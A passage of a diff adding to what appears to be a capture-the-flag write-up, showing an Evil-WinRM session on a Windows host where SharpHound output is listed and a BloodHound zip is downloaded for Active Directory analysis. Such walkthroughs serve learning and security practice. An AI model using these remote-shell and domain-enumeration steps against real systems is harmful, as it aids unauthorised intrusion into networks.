@@ -312,8 +312,31 @@ Now the .exe is uploaded, i can execute it!
 This executed the .exe, and after a second:
 
 ```python
+*Evil-WinRM* PS C:\Users\ATHENA_SVC\Documents> dir
 
+
+    Directory: C:\Users\ATHENA_SVC\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/15/2026  12:58 PM          31326 20260515125755_BloodHound.zip
+-a----         5/15/2026  12:58 PM           1296 NTIwNWE1MWMtOTVjMy00ODg3LWE0YmQtNWM4NWIxYjY3NWUw.bin
+-a----         5/15/2026  12:57 PM        1351680 SharpHound.exe
+
+
+*Evil-WinRM* PS C:\Users\ATHENA_SVC\Documents> download 20260515125755_BloodHound.zip
+                                        
+Info: Downloading C:\Users\ATHENA_SVC\Documents\20260515125755_BloodHound.zip to 20260515125755_BloodHound.zip
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\ATHENA_SVC\Documents>
 ```
+Ive now downloaded the data, so now i can spin up bloodhound!
+
+# Bloodhound
+
+
 
 
 
